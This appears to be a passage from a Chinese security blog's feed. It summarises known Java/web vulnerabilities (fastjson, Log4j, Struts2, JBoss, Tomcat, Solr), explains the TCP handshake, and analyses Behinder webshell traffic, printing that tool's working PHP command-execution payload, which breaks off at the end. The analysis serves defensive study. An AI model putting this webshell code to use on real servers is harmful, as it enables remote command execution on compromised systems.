字符串，parseObject 方法则反过来将 JSON 字符串转换成对象。</p><h5 id="二、fastjson反序列化漏洞原理"><a href="#二、fastjson反序列化漏洞原理" class="headerlink" title="二、fastjson反序列化漏洞原理"></a>二、fastjson反序列化漏洞原理</h5><p>在反序列化的时候，会进入parseField方法，进入该方法后，就会调用setValue(object, value)方法，在这里，会执行构造的恶意代码，最后造成代码执行。</p><h4 id="fastjson-1-2-24反序列化"><a href="#fastjson-1-2-24反序列化" class="headerlink" title="fastjson 1.2.24反序列化"></a>fastjson 1.2.24反序列化</h4><p><em><strong>（CVE-2017-18349）</strong></em></p><p><strong>漏洞简介：</strong><br>利用fastjson autotype在处理json对象时，未对@type字段进行安全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程RMI主机，通过其中的恶意类执行代码。<br><strong>影响版本：</strong><br>fastjson &lt; 1.2.25</p><h4 id="json劫持"><a href="#json劫持" class="headerlink" title="json劫持"></a>json劫持</h4><p>json劫持类似于csrf,某些web应用程序会将敏感信息转换为json格式返回到前端,而非官方的</p><p>JSON劫持(JSON Hijacking )就是对数据进行窃取。恶意攻击者通过某些特定的手段，将本应该返回给用户的JSON数据进行拦截，转而将数据发送回给恶意攻击者，这就是JSON劫持的大概含义。一般来说进行劫持的JSON数据都是包含敏感信息或者有价值的数据。</p><p><strong>风险描述</strong></p><p>fastjson已使用黑白名单用于防御反序列化漏洞，经研究该利用在特定条件下可绕过默认autoType关闭限制，攻击远程服务器</p><h4 id="log4jt漏洞"><a href="#log4jt漏洞" class="headerlink" title="log4jt漏洞"></a><strong>log4jt漏洞</strong></h4><p>CVE-2021-44228(Log4j 2远程命令执行漏洞)</p><p><strong>漏洞原理</strong><br>此次漏洞的出现，正是由用于 Log4j 2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。简单来说，就是在打印日志时，如果发现日志内容中包含关键词 ${，那么这个里面包含的内容会当做变量来进行替换，导致攻击者可以任意执行命令。</p><h4 id="tomcat历史漏洞"><a href="#tomcat历史漏洞" class="headerlink" title="tomcat历史漏洞"></a>tomcat历史漏洞</h4><p>Tomcat任意写入文件漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（例如，将 <span class="hljs-built_in">readonly</span> 初始化参数由默认值设置为 <span class="hljs-literal">false</span>），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。<br><br>漏洞的产生是由于配置不当（非默认配置），将配置文件（<br>conf/web.xml）中的<span class="hljs-built_in">readonly</span>设置为了<span class="hljs-literal">false</span>，导致可以使用PUT方法上传<br>任意文件，但限制了jsp后缀，不过对于不同平台有多种绕过方法<br></code></pre></td></tr></table></figure><h4 id="crlf注入"><a href="#crlf注入" class="headerlink" title="crlf注入"></a>crlf注入</h4><p>CRLF注入在OWASP 里面被称为HTTP拆分攻击（HTTP Splitting）CRLF是”回车 + 换行”（\r\n）的简称,在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行</p><h4 id="JBOSS漏洞"><a href="#JBOSS漏洞" class="headerlink" title="JBOSS漏洞"></a>JBOSS漏洞</h4><p>JBOSSAS 5.x&#x2F;6.x 反序列化命令执行漏洞（CVE-2017-12149）</p><p><strong>漏洞描述</strong></p><p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p><p><strong>攻击方式</strong></p><p>攻击者只需要构造带有需要执行Payload的ser文件，然后使用curl将二进制文件提交至目标服务器的invoker&#x2F;readonly页面中，即可执行Payload中指定的命令，获取对电脑的控制权。</p><h4 id="Struct2漏洞"><a href="#Struct2漏洞" class="headerlink" title="Struct2漏洞"></a>Struct2漏洞</h4><p><strong>struts2漏洞 S2-001</strong><br>漏洞原理<br>该漏洞因用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL表达式%{value}进行解析，然后重新填充到对应的表单数据中。如注册或登录页面，提交失败后一般会默认返回之前提交的数据，由于后端使用%{value}对提交的数据执行了一次OGNL 表达式解析，所以可以直接构造 Payload进行命令执行。</p><p><strong>struts2漏洞 S2-005</strong><br>原理<br>s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上。<br>XWork会将GET参数的键和值利用OGNL表达式解析成Java语句</p><p><strong>struts2漏洞 S2-046</strong><br>原理<br>在使用基于Jakarta插件的文件上传功能时，满足以下条件，会触发远程命令执行漏洞。</p><p>1.上传文件的大小（由Content-Length头指定）大于Struts2允许的最大大小（2GB）。</p><p>2.文件名内容构造恶意的OGNL内容。</p><p>本次S2-046漏洞远程命令执行漏洞需满足以上条件，而S2-045的漏洞只需要Content-Type一个点就可以进行远程命令执行</p><p><strong>struts2漏洞 S2-032</strong></p><p>原理</p><p>Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用<code>method:&lt;name&gt;</code>的方式来调用名字是<code>&lt;name&gt;</code>的方法，而这个方法名将会进行<strong>OGNL</strong>表达式计算，导致远程命令执行漏洞。</p><p><strong>struts2漏洞 S2-045</strong></p><p>原理</p><p>恶意用户可在上传文件时通过修改HTTP请求头中的<strong>Content-Type</strong>值来触发该漏洞，进而执行系统命令。</p><p><strong>apache slor漏洞</strong></p><h4 id="apache-solr远程代码执行漏洞"><a href="#apache-solr远程代码执行漏洞" class="headerlink" title="apache solr远程代码执行漏洞"></a>apache solr远程代码执行漏洞</h4><p>(cve-2019-0193)</p><p>漏洞描述:<br>Apache Solr如果启用了DataImportHandler模块，因为它支持使用web请求来指定配置信息,例如”DIH配置” ，攻击者可构造HTTP请求指定dataConfig参数的值(dataConfig内容)，构造恶意数据,dataConfig内容完全可控(多种利用方式)，它在后端处理的过程中，可导致命令执行。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CVE漏洞收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TCP三握四挥原理浅析</title>
    <link href="/2023/01/22/tcp/"/>
    <url>/2023/01/22/tcp/</url>
    
    <content type="html"><![CDATA[<h3 id="TCP建立连接前的三次握手"><a href="#TCP建立连接前的三次握手" class="headerlink" title="TCP建立连接前的三次握手"></a>TCP建立连接前的三次握手</h3><p>注意：基于TCP协议的数据传输在数据传送前需要先建立链接</p><p><img src="/images/tcplink.png" alt="tcplink"></p><p><strong>建立连接的执行步骤如下所述：</strong></p><blockquote><p>1.客户端发送连接请求报文给服务器，该报文的seq（序号）有值，以x表示，SYN标志位置为1，表示连接请求</p><p>2.服务器的传输控制块（TCB）接收到客户端的连接请求报文后，发送一个连接响应报文给客户端，该报文的ACK，SYN的标志位置为1<br>ack（确认号）的值置为x+1（虽然连接请求报文由于TCP规定不能携带传输数据，但是要消耗掉一个序号，所以ack为x+1）该报文的 seq有值，以y表示</p><p>3.客户端收到服务端发送过来的连接响应报文后，会发送个连接确认报文（报文段）给服务器，该报文的ACK置位为1，seq置为x+1，<br>ack的值为y+1(ack的值表示下次数据传输过来的报文段的序号值)</p></blockquote><p><em>以上三个步骤都完成后就和服务器建立连接。双方可以在该连接上传输数据</em></p><p> <strong>#为什么是三次，而不是两次握手说明</strong></p><blockquote><p>一句话，主要防止已经失效的连接请求报文突然又传送到了服务器，从而产生错误。</p><p>如果使用的是两次握手建立连接，假设有这样一种场景，客户端发送了第一个请求连接并且没有丢失，只是因为在网络结点中滞留的时间太长了，<br>由于TCP的客户端迟迟没有收到确认报文，以为服务器没有收到，此时重新向服务器发送这条报文，此后客户端和服务器经过两次握手完成连接，<br>传输数据，然后关闭连接。此时此前滞留的那一次请求连接，网络通畅了到达了服务器，这个报文本该是失效的，但是，两次握手的机制将会让客户端和服务器再次建立连接，这将导致不必要的错误和资源的浪费。</p><p>如果采用的是三次握手，就算是那一次失效的报文传送过来了，服务端接受到了那条失效报文并且回复了确认报文，但是客户端不会再次发出确认。<br>由于服务器收不到确认，就知道客户端并没有请求连接。</p></blockquote><h3 id="TCP释放连接前的四次挥手"><a href="#TCP释放连接前的四次挥手" class="headerlink" title="TCP释放连接前的四次挥手"></a>TCP释放连接前的四次挥手</h3><p><img src="/images/stop.png" alt="stop"></p><p><strong>释放连接的执行步骤如下所述：</strong></p><blockquote><p>1.客户端想要释放连接，首先向服务器发送连接释放请求报文，该报文的ACK置位为1，（如果之前有数据传输的话），<br>seq有值，以i表示（该值为之前传输过来的数据的最后一个字节的序号加1），FIN置位为1，表示请求终止。之后客户端进入终止等待状态</p><p>2.服务器收到连接释放请求报文后，向客户端发送连接释放确认报文，该报文的ACK置位为1，ack值为i+1，seq置为j</p><p>3.1 客户端收到服务器发送过来的连接释放确认报文后，进入终止等待状态</p><p>3.2 服务器发送完数据后，向客户端发送连接释放二次确认报文，该报文的ACK，FIN都置位为1，ack值为i+1，seq置位为w(服务器发送二次的报文的seq不同是因为间隔之间可能进行了数据传输，使得seq(序号)发生改变)，之后服务器进入最后确认状态</p><p>4.客户端收到服务器发来的连接释放二次确认报文后，向服务器发送连接释放确认报文。ACK标志位置为1，该报文seq置位为i+1，ack置为w+1，<br>之后客户端就进入了TIME-WAIT（时间等待）状态。注意此时TCP连接还没有释放，必须经过2∗ *∗MSL（最长报文段寿命）的时间后，<br>当客户端撤销相应的TCB后，才进入CLOSED状态。</p><p>5.服务器只要收到了客户端发出的确认，立即进入CLOSED状态。同样，撤销TCB后，就结束了这次的TCP连接</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>网络协议相关</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于冰蝎工具的简易流量分析</title>
    <link href="/2023/01/03/liuliang/"/>
    <url>/2023/01/03/liuliang/</url>
    
    <content type="html"><![CDATA[<h4 id="冰蝎执行系统命令的过程"><a href="#冰蝎执行系统命令的过程" class="headerlink" title="冰蝎执行系统命令的过程:"></a><strong>冰蝎执行系统命令的过程:</strong></h4><blockquote><p>首先将经过base64加密后面的一段PHP代码放在htpp请求体中,通过HTTP包发送给目标服务器上的shell.php(我们已经写入的恶意php文件)</p><p>在命令执行之前,先进行屏蔽错误信息等php代码,为当前脚本执行提供良好的运行环境</p><p>然后确定phpini中disable_function的内容,返回一个数组成员为禁止使用函数的索引数组</p><p>之后确定服务器的操作系统类型,根据类型调整 要执行的命令格式</p><p>然后确定不在disable_function中能执行命令的函数 (注意:冰蝎中执行命令的函数种类并不齐全)</p><p>如果有未被禁用能执行命令函数,则调用并将结果赋值给$kWJW;</p><p>结果经过编码后赋值给一个关联数组,成员名字为msg,另一个表示命令执行状态:status</p><p>最后对 经过json编码的关联数组 进行异或运算(如果开启openssl扩展的话,使用另一种方式加密),返回加密后的数据,客户端通过默认密匙解密返回的结果</p></blockquote><h4 id="附件-命令执行的相关代码"><a href="#附件-命令执行的相关代码" class="headerlink" title="附件:(命令执行的相关代码)"></a>附件:(命令执行的相关代码)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">//设置不显示错误信息</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getSafeStr</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$s1</span> = <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>,<span class="hljs-string">&#x27;gbk//IGNORE&#x27;</span>,<span class="hljs-variable">$str</span>);<span class="hljs-comment">//将$str从utf-8的编码格式转为gbk编码格式</span><br>    <span class="hljs-variable">$s0</span> = <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&#x27;gbk&#x27;</span>,<span class="hljs-string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="hljs-variable">$s1</span>);<span class="hljs-comment">//将$s1从gbk的编码格式转为utf-8编码格式</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s0</span> == <span class="hljs-variable">$str</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$s0</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//防止编码转换时出现错误影响后面的执行过程</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&#x27;gbk&#x27;</span>,<span class="hljs-string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="hljs-variable">$str</span>);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span>,<span class="hljs-variable">$path</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    @<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">//设置脚本最大执行时间为没有限制</span><br>    @<span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>); <span class="hljs-comment">//设置客户端断开连接时不中断脚本的执行</span><br>    @<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;max_execution_time&#x27;</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">//数值 0 表示没有执行时间的限制</span><br>    <span class="hljs-variable">$result</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-variable">$PadtJn</span> = @<span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;disable_functions&#x27;</span>); <span class="hljs-comment">//查询是否有禁用某些函数,如果有,返回的是例如&quot;exec,system,phpinfo&quot;这样以逗号分隔的字符串</span><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$PadtJn</span>)) &#123;  <span class="hljs-comment">//判断是否有禁用函数</span><br>        <span class="hljs-variable">$PadtJn</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[, ]+/&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$PadtJn</span>); <span class="hljs-comment">//过滤可能存在的空格</span><br>        <span class="hljs-variable">$PadtJn</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$PadtJn</span>); <span class="hljs-comment">//以逗号作为分割符,返回一个索引数组</span><br>        <span class="hljs-variable">$PadtJn</span> = <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&#x27;trim&#x27;</span>, <span class="hljs-variable">$PadtJn</span>); <span class="hljs-comment">//执行trim函数移除字符串两侧的空白字符或其他预定义字符。</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$PadtJn</span> = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-comment">//判断目标服务器运行的操作系统类型</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">FALSE</span> !== <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-title function_ invoke__">strtolower</span>(PHP_OS), <span class="hljs-string">&#x27;win&#x27;</span>)) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$c</span> . <span class="hljs-string">&quot; 2&gt;&amp;1\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$JueQDBH</span> = <span class="hljs-string">&#x27;is_callable&#x27;</span>;<br>    <span class="hljs-variable">$Bvce</span> = <span class="hljs-string">&#x27;in_array&#x27;</span>;<br>    <span class="hljs-comment">//is_callable() 检测函数在当前环境中是否可调用</span><br><br>    <span class="hljs-comment">//下面的if判断基本用于确定可被用来执行系统命令的预定义函数</span><br><br><br>    <span class="hljs-comment">// 判断该函数是否包含在phpini的disable_function中</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$JueQDBH</span>(<span class="hljs-string">&#x27;system&#x27;</span>) <span class="hljs-keyword">and</span> ! <span class="hljs-variable">$Bvce</span>(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-variable">$PadtJn</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">ob_start</span>();<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$kWJW</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>    &#125;<br><br>    <span class="hljs-comment">//判断是否能使用proc_open()</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$JueQDBH</span>(<span class="hljs-string">&#x27;proc_open&#x27;</span>) <span class="hljs-keyword">and</span> ! <span class="hljs-variable">$Bvce</span>(<span class="hljs-string">&#x27;proc_open&#x27;</span>, <span class="hljs-variable">$PadtJn</span>)) &#123;<br>        <span class="hljs-variable">$handle</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$c</span>, <span class="hljs-keyword">array</span>(<br>            <span class="hljs-keyword">array</span>(<br>                <span class="hljs-string">&#x27;pipe&#x27;</span>,<br>                <span class="hljs-string">&#x27;r&#x27;</span><br>            ),<br>            <span class="hljs-keyword">array</span>(<br>                <span class="hljs-string">&#x27;pipe&#x27;</span>,<br>                <span class="hljs-string">&#x27;w&#x27;</span><br>            ),<br>            <span class="hljs-keyword">array</span>(<br>                <span class="hljs-string">&#x27;pipe&#x27;</span>,<br>                <span class="hljs-string">&#x27;w&#x27;</span><br>            )<br>        ), <span class="hljs-variable">$pipes</span>);<br>        <span class="hljs-variable">$kWJW</span> = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">while</span> (! <span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>])) &#123;<br>            <span class="hljs-variable">$kWJW</span> .= <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-number">1024</span>);<br>        &#125;<br>        @<span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$handle</span>);<br>    &#125;<br><br><br>    <span class="hljs-comment">//判断是否能使用passthru()</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$JueQDBH</span>(<span class="hljs-string">&#x27;passthru&#x27;</span>) <span class="hljs-keyword">and</span> ! <span class="hljs-variable">$Bvce</span>(<span class="hljs-string">&#x27;passthru&#x27;</span>, <span class="hljs-variable">$PadtJn</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">ob_start</span>();<br>        <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$kWJW</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>    &#125;<br><br>    <span class="hljs-comment">//判断是否能使用shell_exec()</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$JueQDBH</span>(<span class="hljs-string">&#x27;shell_exec&#x27;</span>) <span class="hljs-keyword">and</span> ! <span class="hljs-variable">$Bvce</span>(<span class="hljs-string">&#x27;shell_exec&#x27;</span>, <span class="hljs-variable">$PadtJn</span>)) &#123;<br>        <span class="hljs-variable">$kWJW</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//判断是否能使用exec()</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$JueQDBH</span>(<span class="hljs-string">&#x27;exec&#x27;</span>) <span class="hljs-keyword">and</span> ! <span class="hljs-variable">$Bvce</span>(<span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-variable">$PadtJn</span>)) &#123;<br>        <span class="hljs-variable">$kWJW</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$c</span>, <span class="hljs-variable">$kWJW</span>);<br>        <span class="hljs-variable">$kWJW</span> = <span class="hljs-title function_ invoke__">join</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">10</span>), <span class="hljs-variable">$kWJW</span>) . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">10</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//判断是否能使用popen()</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$JueQDBH</span>(<span class="hljs-string">&#x27;exec&#x27;</span>) <span class="hljs-keyword">and</span> ! <span class="hljs-variable">$Bvce</span>(<span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-variable">$PadtJn</span>)) &#123;<br>        <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-variable">$c</span>, <span class="hljs-string">&#x27;r&#x27;</span>);<br>        <span class="hljs-variable">$kWJW</span> = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$fp</span>)) &#123;<br>            <span class="hljs-keyword">while</span> (! <span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123;<br>                <span class="hljs-variable">$kWJW</span> .= <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>);<br>            &#125;<br>        &#125;<br>        @<span class="hljs-title function_ invoke__">pclose</span>(<span class="hljs-variable">$fp</span>);<br>    &#125;<br><br><br>    <span class="hljs-comment">//当proc_open/passthru/shell_exec/exec/system都不可用时执行下面的else语句</span><br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$kWJW</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">//根据是否成功执行命令返回相对应的结果</span><br>        <span class="hljs-variable">$result</span>[<span class="hljs-string">&quot;status&quot;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&quot;fail&quot;</span>);<br>        <span class="hljs-variable">$result</span>[<span class="hljs-string">&quot;msg&quot;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;</span>);<br>        <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">encrypt</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$result</span>), <span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">return</span>;<br><br>    &#125;<br>    <span class="hljs-comment">//根据是否成功执行命令返回相对应的结果</span><br>    <span class="hljs-variable">$result</span>[<span class="hljs-string">&quot;status&quot;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&quot;success&quot;</span>);<br>    <span class="hljs-variable">$result</span>[<span class="hljs-string">&quot;msg&quot;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">getSafeStr</span>(<span class="hljs-variable">$kWJW</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">encrypt</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$result</span>),  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$data</span>);<span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];  <span class="hljs-comment">//这里做异或运算,返回加密后的数据,客户端通过默认密匙解密返回的结果</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">openssl_encrypt</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);  <span class="hljs-comment">//如果开启openssl扩展的话,以指定的方式和 key 加密数据，返回原始或 base64 编码后的字符串。</span><br>    &#125;<br>&#125;<span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;Y2QgL2QgIkM6XHBocFN0dWR5XFBIUFR1dG9yaWFsXFdXV1wiJndob2FtaQ==&quot;</span>;<span class="hljs-variable">$cmd</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$cmd</span>);<span class="hljs-variable">$path</span>=<span class="hljs-string">&quot;QzovcGhwU3R1ZHkvUEhQVHV0b3JpYWwvV1dXLw==&quot;</span>;<span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$path</span>);<br><span class="hljs-title function_ invoke__">main</span>(<span class="hljs-variable">$cmd</span>,<span 